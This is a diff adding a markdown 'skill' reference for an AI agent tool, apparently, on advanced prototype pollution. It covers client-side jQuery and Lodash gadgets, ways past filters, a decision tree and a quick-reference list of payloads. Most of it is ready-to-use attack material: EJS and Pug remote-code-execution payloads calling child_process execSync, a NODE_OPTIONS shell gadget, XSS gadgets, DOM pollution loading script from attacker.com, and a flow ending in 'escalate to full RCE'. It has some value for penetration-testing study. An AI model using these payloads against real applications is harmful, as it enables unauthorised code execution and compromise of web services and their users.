@@ -1,0 +1,249 @@
+# SKILL: Prototype Pollution Advanced — RCE & Gadget Exploitation: detailed technique reference
+
+<!-- zhiyugo:resource:start -->
+> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
+<!-- zhiyugo:resource:end -->
+
+<!-- zhiyugo:toc:start -->
+## Contents
+
+- [2. CLIENT-SIDE PROTOTYPE POLLUTION](#2-client-side-prototype-pollution)
+- [3. DETECTION TECHNIQUES](#3-detection-techniques)
+- [4. BYPASS `__proto__` FILTERS](#4-bypass-proto-filters)
+- [5. EXPLOITATION FLOW](#5-exploitation-flow)
+- [6. DECISION TREE](#6-decision-tree)
+- [7. QUICK REFERENCE — KEY PAYLOADS](#7-quick-reference-key-payloads)
+<!-- zhiyugo:toc:end -->
+
+## 2. CLIENT-SIDE PROTOTYPE POLLUTION
+
+### 2.1 jQuery Gadgets
+
+`$.extend(true, {}, userInput)` performs deep merge — classic PP sink.
+
+After pollution, jQuery's HTML methods use polluted properties:
+
+```javascript
+// Pollution:
+Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
+
+// Trigger: any jQuery DOM manipulation that reads innerHTML from prototype
+$('<div>').appendTo('body');  // may use polluted property
+```
+
+### 2.2 Lodash Gadgets
+
+```javascript
+// Vulnerable functions (deep merge):
+_.merge({}, userInput)
+_.defaultsDeep({}, userInput)
+_.set(obj, path, value)  // if path is attacker-controlled
+
+// template() gadget:
+Object.prototype.sourceURL = '\u000ajavascript:alert(1)//';
+_.template('hello')();  // sourceURL injected into Function constructor
+```
+
+### 2.3 Script Gadgets in Frameworks
+
+"Script gadgets" are framework code paths that read from `Object.prototype` and perform dangerous operations:
+
+| Framework | Gadget Pattern | Polluted Property | Impact |
+|---|---|---|---|
+| jQuery | `$.html()`, element creation | `innerHTML`, `src` | XSS |
+| Angular.js | `$interpolate` | `__defineGetter__` | XSS |
+| Vue.js | Template compilation | `template`, `render` | XSS |
+| Ember.js | Component rendering | Various view properties | XSS |
+| Backbone.js | `_.template` | `sourceURL` | XSS |
+
+### 2.4 DOM Property Pollution
+
+```javascript
+Object.prototype.src = 'https://attacker.com/evil.js';
+Object.prototype.href = 'javascript:alert(1)';
+Object.prototype.action = 'https://attacker.com/phish';
+// Any dynamically created element may inherit these
+```
+
+---
+
+## 3. DETECTION TECHNIQUES
+
+### 3.1 Black-Box Server-Side Detection
+
+```
+Step 1: Inject and check
+  POST /api/endpoint
+  {"__proto__":{"polluted":"yes"}}
+  
+  Then: GET /api/anything
+  Check if response contains "polluted" or behavior changes
+
+Step 2: Error-based detection
+  {"__proto__":{"toString":1}}
+  → If server crashes or returns 500, toString was overwritten
+  
+  {"__proto__":{"valueOf":1}}
+  → Same crash-based detection
+
+Step 3: Response differential
+  {"__proto__":{"status":555}}
+  → Check if HTTP status code changes to 555
+  
+  {"__proto__":{"content-type":"text/plain"}}
+  → Check if Content-Type header changes
+```
+
+### 3.2 Black-Box Client-Side Detection
+
+```javascript
+// In browser console after interacting with the app:
+Object.prototype.testPollution
+// If returns a value → something polluted the prototype
+
+// Automated: override defineProperty to detect writes
+Object.defineProperty(Object.prototype, '__proto__', {
+    set: function(v) { console.trace('PP detected!', v); }
+});
+```
+
+### 3.3 Automated Tools
+
+| Tool | Type | Purpose |
+|---|---|---|
+| **PPScan** | Burp Extension | Scans for server-side PP |
+| **server-side-prototype-pollution** | Burp Extension (Gareth Heyes) | Advanced server-side PP detection with multiple techniques |
+| **ppfuzz** | CLI | Fuzz for client-side PP via URL fragment/query |
+| **ppmap** | CLI | Map client-side PP to known gadgets |
+
+---
+
+## 4. BYPASS `__proto__` FILTERS
+
+### 4.1 constructor.prototype Path
+
+```json
+// Instead of:
+{"__proto__": {"polluted": "yes"}}
+
+// Use:
+{"constructor": {"prototype": {"polluted": "yes"}}}
+```
+
+### 4.2 Bracket Notation Variants
+
+```
+?constructor[prototype][polluted]=yes
+?__proto__[polluted]=yes
+?__pro__proto__to__[polluted]=yes   (if filter strips __proto__ once)
+```
+
+### 4.3 JSON Key Variations
+
+```json
+{"__proto__": {"a": 1}}
+{"constructor": {"prototype": {"a": 1}}}
+{"__proto__\u0000": {"a": 1}}
+```
+
+### 4.4 Key Distinction: Shallow vs Deep
+
+`Object.assign` does NOT pollute prototype (shallow copy, safe). Only recursive/deep merge functions are vulnerable. Always verify the merge depth.
+
+---
+
+## 5. EXPLOITATION FLOW
+
+```
+1. Find merge sink (`prototype-pollution` Section 0)
+   └── JSON body parsed and deep-merged into server object
+
+2. Confirm pollution:
+   └── {"__proto__":{"testxyz":"1"}} → check if testxyz appears globally
+
+3. Identify technology stack:
+   ├── Express + EJS → outputFunctionName gadget (Section 1.2)
+   ├── Express + Pug → block gadget (Section 1.3)
+   ├── Express + Handlebars → type/program gadget (Section 1.4)
+   ├── Any Node.js with child_process → shell/NODE_OPTIONS (Section 1.1)
+   ├── Client-side jQuery → DOM gadgets (Section 2.1)
+   ├── Client-side Lodash → template/sourceURL (Section 2.2)
+   └── Unknown → try KNOWN_GADGETS.md systematically
+
+4. Craft RCE/XSS payload matching gadget
+
+5. Verify with safe payload first (sleep / DNS callback)
+
+6. Escalate to full RCE
+```
+
+---
+
+## 6. DECISION TREE
+
+```
+Confirmed prototype pollution?
+│
+├── Server-side or client-side?
+│   │
+│   ├── SERVER-SIDE
+│   │   ├── Template engine in use?
+│   │   │   ├── EJS → __proto__.outputFunctionName (Section 1.2)
+│   │   │   ├── Pug → __proto__.block (Section 1.3)
+│   │   │   ├── Handlebars → __proto__.type (Section 1.4)
+│   │   │   ├── Nunjucks → __proto__.type (Section 1.5)
+│   │   │   └── Unknown → try each gadget from KNOWN_GADGETS.md
+│   │   │
+│   │   ├── child_process used anywhere?
+│   │   │   ├── YES → __proto__.shell + NODE_OPTIONS (Section 1.1)
+│   │   │   └── MAYBE → inject and trigger error to reveal stack
+│   │   │
+│   │   └── No known gadget?
+│   │       ├── Try status code pollution: __proto__.status = 555
+│   │       ├── Try header pollution: __proto__.content-type
+│   │       └── Check KNOWN_GADGETS.md for framework match
+│   │
+│   └── CLIENT-SIDE
+│       ├── jQuery loaded?
+│       │   ├── YES → $.extend deep merge + DOM gadgets (Section 2.1)
+│       │   └── Check ppmap for automated gadget detection
+│       │
+│       ├── Lodash loaded?
+│       │   ├── YES → _.template sourceURL gadget (Section 2.2)
+│       │   └── _.merge as both sink AND gadget
+│       │
+│       └── Framework (Angular/Vue/Ember)?
+│           └── Script gadget lookup (Section 2.3)
+│
+├── __proto__ keyword filtered?
+│   ├── Try constructor.prototype (Section 4.1)
+│   ├── Try bracket notation (Section 4.2)
+│   └── Try JSON key variations (Section 4.3)
+│
+└── Not confirmed yet?
+    └── Go back to `prototype-pollution` for detection
+```
+
+---
+
+## 7. QUICK REFERENCE — KEY PAYLOADS
+
+```json
+// EJS RCE
+{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}
+
+// Pug RCE
+{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('id');//"}}}
+
+// child_process RCE (Node.js)
+{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}
+
+// Lodash template XSS
+{"__proto__":{"sourceURL":"\u000ajavascript:alert(1)//"}}
+
+// Filter bypass (constructor path)
+{"constructor":{"prototype":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}}
+
+// Safe detection probe
+{"__proto__":{"pptest123":"polluted"}}
+```
